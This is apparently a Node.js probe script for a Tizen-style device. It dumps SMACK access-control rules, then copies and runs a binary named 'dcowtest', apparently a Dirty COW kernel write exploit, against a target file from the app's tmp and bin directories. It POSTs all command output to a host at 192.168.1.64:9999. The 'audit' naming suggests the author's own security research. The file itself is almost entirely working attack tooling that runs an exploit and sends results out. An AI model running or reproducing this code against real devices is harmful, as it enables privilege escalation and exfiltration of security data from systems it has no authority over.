"use strict";

var cp = require("child_process");
var http = require("http");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

out.smack_rules_count = run("wc -l /sys/fs/smackfs/load 2>&1");
out.smack_rules_app = run("grep 'xvvl3S1bvH' /sys/fs/smackfs/load 2>&1 | head -40");
out.smack_rules_examples = run("head -30 /sys/fs/smackfs/load 2>&1");

var APP = "/opt/usr/home/owner/apps_rw/xvvl3S1bvH";

out.copy_tmp = run("cat /tmp/dcowtest > " + APP + "/tmp/dcowtest5; chmod 755 " + APP + "/tmp/dcowtest5; ls -laZ " + APP + "/tmp/ 2>&1");
out.exec_tmp = run("printf 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCC' > " + APP + "/tmp/zzz_target; " + APP + "/tmp/dcowtest5 " + APP + "/tmp/zzz_target 2 0x42; echo rc=$?", 240000);

out.exec_bin = run("cat " + APP + "/tmp/dcowtest5 > " + APP + "/bin/dcowtest6 2>&1 && chmod 755 " + APP + "/bin/dcowtest6 && ls -laZ " + APP + "/bin/ 2>&1 && " + APP + "/bin/dcowtest6 " + APP + "/tmp/zzz_target 3 0x43; echo rc=$?", 240000);

out.verify = run("cat " + APP + "/tmp/zzz_target; echo; od -An -tx1 " + APP + "/tmp/zzz_target 2>&1 | head -2");

post("/audit13", out);
